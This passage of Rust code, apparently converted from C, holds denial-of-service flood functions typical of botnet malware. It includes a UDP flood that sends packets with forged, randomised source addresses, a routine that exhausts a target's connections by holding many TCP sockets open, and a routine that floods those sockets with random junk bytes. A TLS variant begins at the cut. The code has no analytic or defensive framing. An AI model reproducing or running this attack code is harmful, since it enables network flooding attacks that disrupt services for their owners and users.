        51192 as libc::c_int as libc::c_uint,
        14402 as libc::c_int as libc::c_uint,
        30017 as libc::c_int as libc::c_uint,
        23510 as libc::c_int as libc::c_uint,
        26838 as libc::c_int as libc::c_uint,
        41965 as libc::c_int as libc::c_uint,
        43005 as libc::c_int as libc::c_uint,
        23350 as libc::c_int as libc::c_uint,
        20736 as libc::c_int as libc::c_uint,
        25538 as libc::c_int as libc::c_uint,
        53699 as libc::c_int as libc::c_uint,
        6634 as libc::c_int as libc::c_uint,
        21529 as libc::c_int as libc::c_uint,
        13495 as libc::c_int as libc::c_uint,
        42696 as libc::c_int as libc::c_uint,
        61668 as libc::c_int as libc::c_uint,
        32204 as libc::c_int as libc::c_uint,
        45719 as libc::c_int as libc::c_uint,
        7343 as libc::c_int as libc::c_uint,
        17169 as libc::c_int as libc::c_uint,
        23321 as libc::c_int as libc::c_uint,
        10548 as libc::c_int as libc::c_uint,
        61579 as libc::c_int as libc::c_uint,
        9391 as libc::c_int as libc::c_uint,
        31249 as libc::c_int as libc::c_uint,
        48242 as libc::c_int as libc::c_uint,
        28142 as libc::c_int as libc::c_uint,
        22505 as libc::c_int as libc::c_uint,
        59068 as libc::c_int as libc::c_uint,
        31435 as libc::c_int as libc::c_uint,
        12863 as libc::c_int as libc::c_uint,
        64269 as libc::c_int as libc::c_uint,
        25463 as libc::c_int as libc::c_uint,
        41637 as libc::c_int as libc::c_uint,
        13365 as libc::c_int as libc::c_uint,
        49555 as libc::c_int as libc::c_uint,
        25235 as libc::c_int as libc::c_uint,
        54412 as libc::c_int as libc::c_uint,
        30773 as libc::c_int as libc::c_uint,
        63768 as libc::c_int as libc::c_uint,
        25636 as libc::c_int as libc::c_uint,
        14664 as libc::c_int as libc::c_uint,
        17122 as libc::c_int as libc::c_uint,
        31139 as libc::c_int as libc::c_uint,
        34002 as libc::c_int as libc::c_uint,
        51012 as libc::c_int as libc::c_uint,
        29896 as libc::c_int as libc::c_uint,
        60492 as libc::c_int as libc::c_uint,
        33661 as libc::c_int as libc::c_uint,
        27835 as libc::c_int as libc::c_uint,
        42584 as libc::c_int as libc::c_uint,
        62338 as libc::c_int as libc::c_uint,
        30024 as libc::c_int as libc::c_uint,
        9376 as libc::c_int as libc::c_uint,
        12520 as libc::c_int as libc::c_uint,
        55687 as libc::c_int as libc::c_uint,
        1278 as libc::c_int as libc::c_uint,
        16534 as libc::c_int as libc::c_uint,
        36564 as libc::c_int as libc::c_uint,
        4657 as libc::c_int as libc::c_uint,
        39390 as libc::c_int as libc::c_uint,
        35311 as libc::c_int as libc::c_uint,
        36438 as libc::c_int as libc::c_uint,
        60213 as libc::c_int as libc::c_uint,
        12696 as libc::c_int as libc::c_uint,
        1025 as libc::c_int as libc::c_uint,
        42097 as libc::c_int as libc::c_uint,
        27551 as libc::c_int as libc::c_uint,
        56864 as libc::c_int as libc::c_uint,
        47281 as libc::c_int as libc::c_uint,
        51601 as libc::c_int as libc::c_uint,
        41845 as libc::c_int as libc::c_uint,
        6348 as libc::c_int as libc::c_uint,
        64548 as libc::c_int as libc::c_uint,
        37950 as libc::c_int as libc::c_uint,
        46999 as libc::c_int as libc::c_uint,
        44260 as libc::c_int as libc::c_uint,
        60948 as libc::c_int as libc::c_uint,
        49590 as libc::c_int as libc::c_uint,
        24598 as libc::c_int as libc::c_uint,
        6067 as libc::c_int as libc::c_uint,
        44733 as libc::c_int as libc::c_uint,
        3842 as libc::c_int as libc::c_uint,
        25700 as libc::c_int as libc::c_uint,
        64493 as libc::c_int as libc::c_uint,
        50280 as libc::c_int as libc::c_uint,
        65131 as libc::c_int as libc::c_uint,
        44053 as libc::c_int as libc::c_uint,
        2183 as libc::c_int as libc::c_uint,
        38717 as libc::c_int as libc::c_uint,
        26863 as libc::c_int as libc::c_uint,
        18466 as libc::c_int as libc::c_uint,
        63158 as libc::c_int as libc::c_uint,
        19157 as libc::c_int as libc::c_uint,
        64149 as libc::c_int as libc::c_uint,
        35749 as libc::c_int as libc::c_uint,
        35866 as libc::c_int as libc::c_uint,
        19419 as libc::c_int as libc::c_uint,
        57631 as libc::c_int as libc::c_uint,
        22316 as libc::c_int as libc::c_uint,
        5999 as libc::c_int as libc::c_uint,
        12874 as libc::c_int as libc::c_uint,
        15750 as libc::c_int as libc::c_uint,
        13501 as libc::c_int as libc::c_uint,
        47211 as libc::c_int as libc::c_uint,
        40811 as libc::c_int as libc::c_uint,
        36714 as libc::c_int as libc::c_uint,
        63864 as libc::c_int as libc::c_uint,
        18367 as libc::c_int as libc::c_uint,
        20226 as libc::c_int as libc::c_uint,
        21694 as libc::c_int as libc::c_uint,
        23138 as libc::c_int as libc::c_uint,
        28996 as libc::c_int as libc::c_uint,
        25332 as libc::c_int as libc::c_uint,
        22059 as libc::c_int as libc::c_uint,
        33340 as libc::c_int as libc::c_uint,
        4294 as libc::c_int as libc::c_uint,
        19126 as libc::c_int as libc::c_uint,
        36743 as libc::c_int as libc::c_uint,
        33744 as libc::c_int as libc::c_uint,
        18095 as libc::c_int as libc::c_uint,
        33690 as libc::c_int as libc::c_uint,
        3180 as libc::c_int as libc::c_uint,
        24811 as libc::c_int as libc::c_uint,
        55053 as libc::c_int as libc::c_uint,
        16922 as libc::c_int as libc::c_uint,
        45333 as libc::c_int as libc::c_uint,
        27739 as libc::c_int as libc::c_uint,
        4051 as libc::c_int as libc::c_uint,
        6080 as libc::c_int as libc::c_uint,
        58680 as libc::c_int as libc::c_uint,
        4813 as libc::c_int as libc::c_uint,
        62691 as libc::c_int as libc::c_uint,
        64783 as libc::c_int as libc::c_uint,
        39656 as libc::c_int as libc::c_uint,
        56301 as libc::c_int as libc::c_uint,
        20546 as libc::c_int as libc::c_uint,
        34307 as libc::c_int as libc::c_uint,
        56048 as libc::c_int as libc::c_uint,
        9642 as libc::c_int as libc::c_uint,
        7115 as libc::c_int as libc::c_uint,
        25974 as libc::c_int as libc::c_uint,
        64079 as libc::c_int as libc::c_uint,
    ];
    let mut end: libc::c_int = (time(0 as *mut time_t) + timeEnd as libc::c_long)
        as libc::c_int;
    let mut ii: libc::c_uint = 0 as libc::c_int as libc::c_uint;
    loop {
        (*iph)
            .saddr = ((class[(rand_cmwc())
            .wrapping_rem(431 as libc::c_int as libc::c_uint) as usize] as libc::c_ulong
            & 0xff as libc::c_int as libc::c_ulong) << 24 as libc::c_int
            | (class[(rand_cmwc()).wrapping_rem(431 as libc::c_int as libc::c_uint)
                as usize] as libc::c_ulong & 0xff00 as libc::c_int as libc::c_ulong)
                << 8 as libc::c_int
            | (class[(rand_cmwc()).wrapping_rem(431 as libc::c_int as libc::c_uint)
                as usize] as libc::c_ulong & 0xff0000 as libc::c_int as libc::c_ulong)
                >> 8 as libc::c_int
            | (class[(rand_cmwc()).wrapping_rem(431 as libc::c_int as libc::c_uint)
                as usize] as libc::c_ulong & 0xff000000 as libc::c_uint as libc::c_ulong)
                >> 24 as libc::c_int) as uint32_t;
        (*udph)
            .source = ((*sport
            .as_mut_ptr()
            .offset(randnum(0 as libc::c_int, packet_size) as isize) as libc::c_ushort
            as libc::c_int & 0xff as libc::c_int) << 8 as libc::c_int
            | (*sport
                .as_mut_ptr()
                .offset(randnum(0 as libc::c_int, packet_size) as isize)
                as libc::c_ushort as libc::c_int & 0xff00 as libc::c_int)
                >> 8 as libc::c_int) as uint16_t;
        packet_lenght = randnum(500 as libc::c_int, packet_size);
        let mut fake_id_0: libc::c_int = (rand_cmwc() & 0xffffffff as libc::c_uint)
            as libc::c_int;
        (*iph)
            .id = ((fake_id_0 as libc::c_ulong & 0xff as libc::c_int as libc::c_ulong)
            << 24 as libc::c_int
            | (fake_id_0 as libc::c_ulong & 0xff00 as libc::c_int as libc::c_ulong)
                << 8 as libc::c_int
            | (fake_id_0 as libc::c_ulong & 0xff0000 as libc::c_int as libc::c_ulong)
                >> 8 as libc::c_int
            | (fake_id_0 as libc::c_ulong & 0xff000000 as libc::c_uint as libc::c_ulong)
                >> 24 as libc::c_int) as uint16_t;
        memcpy(
            (udph as *mut libc::c_void)
                .offset(::std::mem::size_of::<udphdr>() as libc::c_ulong as isize),
            payload1.as_mut_ptr() as *const libc::c_void,
            packet_lenght as libc::c_ulong,
        );
        (*udph)
            .len = (((::std::mem::size_of::<udphdr>() as libc::c_ulong)
            .wrapping_add(packet_lenght as libc::c_ulong) as libc::c_ushort
            as libc::c_int & 0xff as libc::c_int) << 8 as libc::c_int
            | ((::std::mem::size_of::<udphdr>() as libc::c_ulong)
                .wrapping_add(packet_lenght as libc::c_ulong) as libc::c_ushort
                as libc::c_int & 0xff00 as libc::c_int) >> 8 as libc::c_int) as uint16_t;
        (*iph)
            .tot_len = (::std::mem::size_of::<iphdr>() as libc::c_ulong)
            .wrapping_add(::std::mem::size_of::<udphdr>() as libc::c_ulong)
            .wrapping_add(packet_lenght as libc::c_ulong) as uint16_t;
        (*iph)
            .check = csum(
            datagram.as_mut_ptr() as *mut libc::c_ushort,
            (*iph).tot_len as libc::c_int,
        );
        sendto(
            s,
            datagram.as_mut_ptr() as *const libc::c_void,
            (*iph).tot_len as size_t,
            0 as libc::c_int,
            &mut sin as *mut sockaddr_in as *mut sockaddr,
            ::std::mem::size_of::<sockaddr_in>() as libc::c_ulong as socklen_t,
        );
    };
}
#[no_mangle]
pub unsafe extern "C" fn pktSend(
    mut td: *mut libc::c_char,
    mut port: libc::c_int,
    mut packet_size: libc::c_int,
    mut num_threads: libc::c_int,
    mut timeEnd: libc::c_int,
) {
    let mut i_0: libc::c_int = 0;
    i_0 = 0 as libc::c_int;
    while i_0 < num_threads {
        pktLd(td, port, packet_size, timeEnd);
        i_0 += 1;
    }
}
#[no_mangle]
pub unsafe extern "C" fn sendHLD(
    mut ip: *mut libc::c_uchar,
    mut port: libc::c_int,
    mut end_time: libc::c_int,
) {
    let mut max: libc::c_int = getdtablesize() / 2 as libc::c_int;
    let mut i_0: libc::c_int = 0;
    let mut dest_addr: sockaddr_in = sockaddr_in {
        sin_family: 0,
        sin_port: 0,
        sin_addr: in_addr { s_addr: 0 },
        sin_zero: [0; 8],
    };
    dest_addr.sin_family = 2 as libc::c_int as sa_family_t;
    dest_addr
        .sin_port = ((port as libc::c_ushort as libc::c_int & 0xff as libc::c_int)
        << 8 as libc::c_int
        | (port as libc::c_ushort as libc::c_int & 0xff00 as libc::c_int)
            >> 8 as libc::c_int) as in_port_t;
    if getHost(ip, &mut dest_addr.sin_addr) != 0 {
        return;
    }
    memset(
        (dest_addr.sin_zero).as_mut_ptr() as *mut libc::c_void,
        '\0' as i32,
        ::std::mem::size_of::<[libc::c_uchar; 8]>() as libc::c_ulong,
    );
    let vla = max as usize;
    let mut fds: Vec::<state_t> = ::std::vec::from_elem(
        state_t { fd: 0, state: 0 },
        vla,
    );
    memset(
        fds.as_mut_ptr() as *mut libc::c_void,
        0 as libc::c_int,
        (max as libc::c_ulong)
            .wrapping_mul(
                (::std::mem::size_of::<libc::c_int>() as libc::c_ulong)
                    .wrapping_add(1 as libc::c_int as libc::c_ulong),
            ),
    );
    let mut myset: fd_set = fd_set { __fds_bits: [0; 16] };
    let mut tv: timeval = timeval { tv_sec: 0, tv_usec: 0 };
    let mut lon: socklen_t = 0;
    let mut valopt: libc::c_int = 0;
    let mut res: libc::c_int = 0;
    let mut end: libc::c_int = (time(0 as *mut time_t) + end_time as libc::c_long)
        as libc::c_int;
    while end as libc::c_long > time(0 as *mut time_t) {
        i_0 = 0 as libc::c_int;
        while i_0 < max {
            match (*fds.as_mut_ptr().offset(i_0 as isize)).state as libc::c_int {
                0 => {
                    (*fds.as_mut_ptr().offset(i_0 as isize))
                        .fd = socket(
                        2 as libc::c_int,
                        SOCK_STREAM as libc::c_int,
                        0 as libc::c_int,
                    );
                    fcntl(
                        (*fds.as_mut_ptr().offset(i_0 as isize)).fd,
                        4 as libc::c_int,
                        fcntl(
                            (*fds.as_mut_ptr().offset(i_0 as isize)).fd,
                            3 as libc::c_int,
                            0 as *mut libc::c_void,
                        ) | 0o4000 as libc::c_int,
                    );
                    if connect(
                        (*fds.as_mut_ptr().offset(i_0 as isize)).fd,
                        &mut dest_addr as *mut sockaddr_in as *mut sockaddr,
                        ::std::mem::size_of::<sockaddr_in>() as libc::c_ulong
                            as socklen_t,
                    ) != -(1 as libc::c_int) || *__errno_location() != 115 as libc::c_int
                    {
                        close((*fds.as_mut_ptr().offset(i_0 as isize)).fd);
                    } else {
                        (*fds.as_mut_ptr().offset(i_0 as isize))
                            .state = 1 as libc::c_int as uint8_t;
                    }
                }
                1 => {
                    let mut __d0: libc::c_int = 0;
                    let mut __d1: libc::c_int = 0;
                    let fresh56 = &mut __d0;
                    let fresh57;
                    let fresh58 = (::std::mem::size_of::<fd_set>() as libc::c_ulong)
                        .wrapping_div(
                            ::std::mem::size_of::<__fd_mask>() as libc::c_ulong,
                        );
                    let fresh59 = &mut __d1;
                    let fresh60;
                    let fresh61 = &mut *(myset.__fds_bits)
                        .as_mut_ptr()
                        .offset(0 as libc::c_int as isize) as *mut __fd_mask;
                    asm!(
                        "cld; rep; stosq", inlateout("cx")
                        c2rust_asm_casts::AsmCast::cast_in(fresh56, fresh58) => fresh57,
                        inlateout("di") c2rust_asm_casts::AsmCast::cast_in(fresh59,
                        fresh61) => fresh60, inlateout("ax") 0 as libc::c_int => _,
                        options(preserves_flags)
                    );
                    c2rust_asm_casts::AsmCast::cast_out(fresh56, fresh58, fresh57);
                    c2rust_asm_casts::AsmCast::cast_out(fresh59, fresh61, fresh60);
                    myset
                        .__fds_bits[((*fds.as_mut_ptr().offset(i_0 as isize)).fd
                        / (8 as libc::c_int
                            * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong
                                as libc::c_int)) as usize]
                        |= ((1 as libc::c_ulong)
                            << (*fds.as_mut_ptr().offset(i_0 as isize)).fd
                                % (8 as libc::c_int
                                    * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong
                                        as libc::c_int)) as __fd_mask;
                    tv.tv_sec = 0 as libc::c_int as __time_t;
                    tv.tv_usec = 10000 as libc::c_int as __suseconds_t;
                    res = select(
                        (*fds.as_mut_ptr().offset(i_0 as isize)).fd + 1 as libc::c_int,
                        0 as *mut fd_set,
                        &mut myset,
                        0 as *mut fd_set,
                        &mut tv,
                    );
                    if res == 1 as libc::c_int {
                        lon = ::std::mem::size_of::<libc::c_int>() as libc::c_ulong
                            as socklen_t;
                        getsockopt(
                            (*fds.as_mut_ptr().offset(i_0 as isize)).fd,
                            1 as libc::c_int,
                            4 as libc::c_int,
                            &mut valopt as *mut libc::c_int as *mut libc::c_void,
                            &mut lon,
                        );
                        if valopt != 0 {
                            close((*fds.as_mut_ptr().offset(i_0 as isize)).fd);
                            (*fds.as_mut_ptr().offset(i_0 as isize))
                                .state = 0 as libc::c_int as uint8_t;
                        } else {
                            (*fds.as_mut_ptr().offset(i_0 as isize))
                                .state = 2 as libc::c_int as uint8_t;
                        }
                    } else if res == -(1 as libc::c_int) {
                        close((*fds.as_mut_ptr().offset(i_0 as isize)).fd);
                        (*fds.as_mut_ptr().offset(i_0 as isize))
                            .state = 0 as libc::c_int as uint8_t;
                    }
                }
                2 => {
                    let mut __d0_0: libc::c_int = 0;
                    let mut __d1_0: libc::c_int = 0;
                    let fresh62 = &mut __d0_0;
                    let fresh63;
                    let fresh64 = (::std::mem::size_of::<fd_set>() as libc::c_ulong)
                        .wrapping_div(
                            ::std::mem::size_of::<__fd_mask>() as libc::c_ulong,
                        );
                    let fresh65 = &mut __d1_0;
                    let fresh66;
                    let fresh67 = &mut *(myset.__fds_bits)
                        .as_mut_ptr()
                        .offset(0 as libc::c_int as isize) as *mut __fd_mask;
                    asm!(
                        "cld; rep; stosq", inlateout("cx")
                        c2rust_asm_casts::AsmCast::cast_in(fresh62, fresh64) => fresh63,
                        inlateout("di") c2rust_asm_casts::AsmCast::cast_in(fresh65,
                        fresh67) => fresh66, inlateout("ax") 0 as libc::c_int => _,
                        options(preserves_flags)
                    );
                    c2rust_asm_casts::AsmCast::cast_out(fresh62, fresh64, fresh63);
                    c2rust_asm_casts::AsmCast::cast_out(fresh65, fresh67, fresh66);
                    myset
                        .__fds_bits[((*fds.as_mut_ptr().offset(i_0 as isize)).fd
                        / (8 as libc::c_int
                            * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong
                                as libc::c_int)) as usize]
                        |= ((1 as libc::c_ulong)
                            << (*fds.as_mut_ptr().offset(i_0 as isize)).fd
                                % (8 as libc::c_int
                                    * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong
                                        as libc::c_int)) as __fd_mask;
                    tv.tv_sec = 0 as libc::c_int as __time_t;
                    tv.tv_usec = 10000 as libc::c_int as __suseconds_t;
                    res = select(
                        (*fds.as_mut_ptr().offset(i_0 as isize)).fd + 1 as libc::c_int,
                        0 as *mut fd_set,
                        0 as *mut fd_set,
                        &mut myset,
                        &mut tv,
                    );
                    if res != 0 as libc::c_int {
                        close((*fds.as_mut_ptr().offset(i_0 as isize)).fd);
                        (*fds.as_mut_ptr().offset(i_0 as isize))
                            .state = 0 as libc::c_int as uint8_t;
                    }
                }
                _ => {}
            }
            i_0 += 1;
        }
    }
}
#[no_mangle]
pub unsafe extern "C" fn realrand(
    mut low: libc::c_int,
    mut high: libc::c_int,
) -> libc::c_int {
    srand(
        (time(0 as *mut time_t) ^ rand_cmwc() as libc::c_long ^ getpid() as libc::c_long)
            as libc::c_uint,
    );
    return rand() % (high + 1 as libc::c_int - low) + low;
}
#[no_mangle]
pub unsafe extern "C" fn rndBytes(mut buf: *mut libc::c_uchar, mut length: libc::c_int) {
    srand(
        (time(0 as *mut time_t) ^ rand_cmwc() as libc::c_long ^ getpid() as libc::c_long)
            as libc::c_uint,
    );
    let mut i_0: libc::c_int = 0 as libc::c_int;
    i_0 = 0 as libc::c_int;
    while i_0 < length {
        *buf
            .offset(
                i_0 as isize,
            ) = (rand() % 255 as libc::c_int + 1 as libc::c_int) as libc::c_uchar;
        i_0 += 1;
    }
}
#[no_mangle]
pub unsafe extern "C" fn rand_str(mut dest_0: *mut libc::c_char, mut length: size_t) {
    let mut charset: [libc::c_char; 63] = *::std::mem::transmute::<
        &[u8; 63],
        &mut [libc::c_char; 63],
    >(b"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\0");
    loop {
        let fresh68 = length;
        length = length.wrapping_sub(1);
        if !(fresh68 > 0 as libc::c_int as libc::c_ulong) {
            break;
        }
        let mut index: size_t = (rand() as libc::c_double
            / 2147483647 as libc::c_int as libc::c_double
            * (::std::mem::size_of::<[libc::c_char; 63]>() as libc::c_ulong)
                .wrapping_sub(1 as libc::c_int as libc::c_ulong) as libc::c_double)
            as size_t;
        let fresh69 = dest_0;
        dest_0 = dest_0.offset(1);
        *fresh69 = charset[index as usize];
    }
    *dest_0 = '\0' as i32 as libc::c_char;
}
#[no_mangle]
pub unsafe extern "C" fn sendJNK(
    mut ip: *mut libc::c_uchar,
    mut port: libc::c_int,
    mut end_time: libc::c_int,
) {
    let mut max: libc::c_int = getdtablesize() / 2 as libc::c_int;
    let mut i_0: libc::c_int = 0;
    let mut dest_addr: sockaddr_in = sockaddr_in {
        sin_family: 0,
        sin_port: 0,
        sin_addr: in_addr { s_addr: 0 },
        sin_zero: [0; 8],
    };
    dest_addr.sin_family = 2 as libc::c_int as sa_family_t;
    dest_addr
        .sin_port = ((port as libc::c_ushort as libc::c_int & 0xff as libc::c_int)
        << 8 as libc::c_int
        | (port as libc::c_ushort as libc::c_int & 0xff00 as libc::c_int)
            >> 8 as libc::c_int) as in_port_t;
    if getHost(ip, &mut dest_addr.sin_addr) != 0 {
        return;
    }
    memset(
        (dest_addr.sin_zero).as_mut_ptr() as *mut libc::c_void,
        '\0' as i32,
        ::std::mem::size_of::<[libc::c_uchar; 8]>() as libc::c_ulong,
    );
    let vla = max as usize;
    let mut fds: Vec::<state_t_0> = ::std::vec::from_elem(
        state_t_0 { fd: 0, state: 0 },
        vla,
    );
    memset(
        fds.as_mut_ptr() as *mut libc::c_void,
        0 as libc::c_int,
        (max as libc::c_ulong)
            .wrapping_mul(
                (::std::mem::size_of::<libc::c_int>() as libc::c_ulong)
                    .wrapping_add(1 as libc::c_int as libc::c_ulong),
            ),
    );
    let mut myset: fd_set = fd_set { __fds_bits: [0; 16] };
    let mut tv: timeval = timeval { tv_sec: 0, tv_usec: 0 };
    let mut lon: socklen_t = 0;
    let mut valopt: libc::c_int = 0;
    let mut res: libc::c_int = 0;
    let mut pakt: *mut libc::c_uchar = malloc(1024 as libc::c_int as libc::c_ulong)
        as *mut libc::c_uchar;
    memset(
        pakt as *mut libc::c_void,
        0 as libc::c_int,
        1024 as libc::c_int as libc::c_ulong,
    );
    let mut packetLen: libc::c_int = 1024 as libc::c_int;
    let mut end: libc::c_int = (time(0 as *mut time_t) + end_time as libc::c_long)
        as libc::c_int;
    while end as libc::c_long > time(0 as *mut time_t) {
        i_0 = 0 as libc::c_int;
        while i_0 < max {
            match (*fds.as_mut_ptr().offset(i_0 as isize)).state as libc::c_int {
                0 => {
                    (*fds.as_mut_ptr().offset(i_0 as isize))
                        .fd = socket(
                        2 as libc::c_int,
                        SOCK_STREAM as libc::c_int,
                        0 as libc::c_int,
                    );
                    fcntl(
                        (*fds.as_mut_ptr().offset(i_0 as isize)).fd,
                        4 as libc::c_int,
                        fcntl(
                            (*fds.as_mut_ptr().offset(i_0 as isize)).fd,
                            3 as libc::c_int,
                            0 as *mut libc::c_void,
                        ) | 0o4000 as libc::c_int,
                    );
                    if connect(
                        (*fds.as_mut_ptr().offset(i_0 as isize)).fd,
                        &mut dest_addr as *mut sockaddr_in as *mut sockaddr,
                        ::std::mem::size_of::<sockaddr_in>() as libc::c_ulong
                            as socklen_t,
                    ) != -(1 as libc::c_int) || *__errno_location() != 115 as libc::c_int
                    {
                        close((*fds.as_mut_ptr().offset(i_0 as isize)).fd);
                    } else {
                        (*fds.as_mut_ptr().offset(i_0 as isize))
                            .state = 1 as libc::c_int as uint8_t;
                    }
                }
                1 => {
                    let mut __d0: libc::c_int = 0;
                    let mut __d1: libc::c_int = 0;
                    let fresh70 = &mut __d0;
                    let fresh71;
                    let fresh72 = (::std::mem::size_of::<fd_set>() as libc::c_ulong)
                        .wrapping_div(
                            ::std::mem::size_of::<__fd_mask>() as libc::c_ulong,
                        );
                    let fresh73 = &mut __d1;
                    let fresh74;
                    let fresh75 = &mut *(myset.__fds_bits)
                        .as_mut_ptr()
                        .offset(0 as libc::c_int as isize) as *mut __fd_mask;
                    asm!(
                        "cld; rep; stosq", inlateout("cx")
                        c2rust_asm_casts::AsmCast::cast_in(fresh70, fresh72) => fresh71,
                        inlateout("di") c2rust_asm_casts::AsmCast::cast_in(fresh73,
                        fresh75) => fresh74, inlateout("ax") 0 as libc::c_int => _,
                        options(preserves_flags)
                    );
                    c2rust_asm_casts::AsmCast::cast_out(fresh70, fresh72, fresh71);
                    c2rust_asm_casts::AsmCast::cast_out(fresh73, fresh75, fresh74);
                    myset
                        .__fds_bits[((*fds.as_mut_ptr().offset(i_0 as isize)).fd
                        / (8 as libc::c_int
                            * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong
                                as libc::c_int)) as usize]
                        |= ((1 as libc::c_ulong)
                            << (*fds.as_mut_ptr().offset(i_0 as isize)).fd
                                % (8 as libc::c_int
                                    * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong
                                        as libc::c_int)) as __fd_mask;
                    tv.tv_sec = 0 as libc::c_int as __time_t;
                    tv.tv_usec = 10000 as libc::c_int as __suseconds_t;
                    res = select(
                        (*fds.as_mut_ptr().offset(i_0 as isize)).fd + 1 as libc::c_int,
                        0 as *mut fd_set,
                        &mut myset,
                        0 as *mut fd_set,
                        &mut tv,
                    );
                    if res == 1 as libc::c_int {
                        lon = ::std::mem::size_of::<libc::c_int>() as libc::c_ulong
                            as socklen_t;
                        getsockopt(
                            (*fds.as_mut_ptr().offset(i_0 as isize)).fd,
                            1 as libc::c_int,
                            4 as libc::c_int,
                            &mut valopt as *mut libc::c_int as *mut libc::c_void,
                            &mut lon,
                        );
                        if valopt != 0 {
                            close((*fds.as_mut_ptr().offset(i_0 as isize)).fd);
                            (*fds.as_mut_ptr().offset(i_0 as isize))
                                .state = 0 as libc::c_int as uint8_t;
                        } else {
                            (*fds.as_mut_ptr().offset(i_0 as isize))
                                .state = 2 as libc::c_int as uint8_t;
                        }
                    } else if res == -(1 as libc::c_int) {
                        close((*fds.as_mut_ptr().offset(i_0 as isize)).fd);
                        (*fds.as_mut_ptr().offset(i_0 as isize))
                            .state = 0 as libc::c_int as uint8_t;
                    }
                }
                2 => {
                    packetLen = realrand(64 as libc::c_int, 1432 as libc::c_int);
                    rndBytes(pakt, packetLen);
                    if send(
                        (*fds.as_mut_ptr().offset(i_0 as isize)).fd,
                        pakt as *const libc::c_void,
                        packetLen as size_t,
                        MSG_NOSIGNAL as libc::c_int,
                    ) == -(1 as libc::c_int) as libc::c_long
                        && *__errno_location() != 11 as libc::c_int
                    {
                        close((*fds.as_mut_ptr().offset(i_0 as isize)).fd);
                        (*fds.as_mut_ptr().offset(i_0 as isize))
                            .state = 0 as libc::c_int as uint8_t;
                    }
                }
                _ => {}
            }
            i_0 += 1;
        }
    }
}
#[no_mangle]
pub unsafe extern "C" fn sendTLS(
    mut ip: *mut libc::c_uchar,
    mut port: libc::c_int,
    mut end_time: libc::c_int,
) {
    let mut max: libc::c_int = getdtablesize() / 2 as libc::c_int;
    let mut i_0: libc::c_int = 0;
    let mut dest_addr: sockaddr_in = sockaddr_in {
        sin_family: 0,
        sin_port: 0,
        sin_addr: in_addr { s_addr: 0 },
        sin_zero: [0; 8],
    };
    dest_addr.sin_family = 2 as libc::c_int as sa_family_t;
    dest_addr
        .sin_port = ((port as libc::c_ushort as libc::c_int & 0xff as libc::c_int)
        << 8 as libc::c_int
        | (port as libc::c_ushort as libc::c_int & 0xff00 as libc::c_int)
            >> 8 as libc::c_int) as in_port_t;
    if getHost(ip, &mut dest_addr.sin_addr) != 0 {
        return;
    }
    memset(
        (dest_addr.sin_zero).as_mut_ptr() as *mut libc::c_void,
        '\0' as i32,
        ::std::mem::size_of::<[libc::c_uchar; 8]>() as libc::c_ulong,
    );
    let vla = max as usize;
    let mut fds: Vec::<state_t_1> = ::std::vec::from_elem(
        state_t_1 { fd: 0, state: 0 },
        vla,
    );
    memset(
        fds.as_mut_ptr() as *mut libc::c_void,
        0 as libc::c_int,
        (max as libc::c_ulong)
            .wrapping_mul(
                (::std::mem::size_of::<libc::c_int>() as libc::c_ulong)
                    .wrapping_add(1 as libc::c_int as libc::c_ulong),
            ),
    );
    let mut myset: fd_set = fd_set { __fds_bits: [0; 16] };
    let mut tv: timeval = timeval { tv_sec: 0, tv_usec: 0 };
    let mut lon: socklen_t = 0;
    let mut valopt: libc::c_int = 0;
    let mut res: libc::c_int = 0;
    let mut end: libc::c_int = (time(0 as *mut time_t) + end_time as libc::c_long)
        as libc::c_int;
    while end as libc::c_long > time(0 as *mut time_t) {
        i_0 = 0 as libc::c_int;
        while i_0 < max {
            match (*fds.as_mut_ptr().offset(i_0 as isize)).state as libc::c_int {
                0 => {
                    (*fds.as_mut_ptr().offset(i_0 as isize))
                        .fd = socket(
                        2 as libc::c_int,
                        SOCK_STREAM as libc::c_int,
                        0 as libc::c_int,
                    );
                    fcntl(
                        (*fds.as_mut_ptr().offset(i_0 as isize)).fd,
                        4 as libc::c_int,
                        fcntl(
                            (*fds.as_mut_ptr().offset(i_0 as isize)).fd,
                            3 as libc::c_int,
                            0 as *mut libc::c_void,
                        ) | 0o4000 as libc::c_int,
                    );
                    if connect(
                        (*fds.as_mut_ptr().offset(i_0 as isize)).fd,
                        &mut dest_addr as *mut sockaddr_in as *mut sockaddr,
                        ::std::mem::size_of::<sockaddr_in>() as libc::c_ulong
                            as socklen_t,
                    ) != -(1 as libc::c_int) || *__errno_location() != 115 as libc::c_int
                    {
                        close((*fds.as_mut_ptr().offset(i_0 as isize)).fd);
                    } else {
                        (*fds.as_mut_ptr().offset(i_0 as isize))
                            .state = 1 as libc::c_int as uint8_t;
                    }
                }
                1 => {
                    let mut __d0: libc::c_int = 0;
                    let mut __d1: libc::c_int = 0;
                    let fresh76 = &mut __d0;
                    let fresh77;
                    let fresh78 = (::std::mem::size_of::<fd_set>() as libc::c_ulong)
                        .wrapping_div(
                            ::std::mem::size_of::<__fd_mask>() as libc::c_ulong,
                        );
                    let fresh79 = &mut __d1;
                    let fresh80;
                    let fresh81 = &mut *(myset.__fds_bits)
                        .as_mut_ptr()
                        .offset(0 as libc::c_int as isize) as *mut __fd_mask;
                    asm!(
                        "cld; rep; stosq", inlateout("cx")
                        c2rust_asm_casts::AsmCast::cast_in(fresh76, fresh78) => fresh77,
                        inlateout("di") c2rust_asm_casts::AsmCast::cast_in(fresh79,
                        fresh81) => fresh80, inlateout("ax") 0 as libc::c_int => _,
                        options(preserves_flags)
                    );
                    c2rust_asm_casts::AsmCast::cast_out(fresh76, fresh78, fresh77);
                    c2rust_asm_casts::AsmCast::cast_out(fresh79, fresh81, fresh80);
                    myset
                        .__fds_bits[((*fds.as_mut_ptr().offset(i_0 as isize)).fd
                        / (8 as libc::c_int
                            * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong
                                as libc::c_int)) as usize]
                        |= ((1 as libc::c_ulong)
                            << (*fds.as_mut_ptr().offset(i_0 as isize)).fd
                                % (8 as libc::c_int
                                    * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong
                                        as libc::c_int)) as __fd_mask;
                    tv.tv_sec = 0 as libc::c_int as __time_t;
                    tv.tv_usec = 20000 as libc::c_int as __suseconds_t;
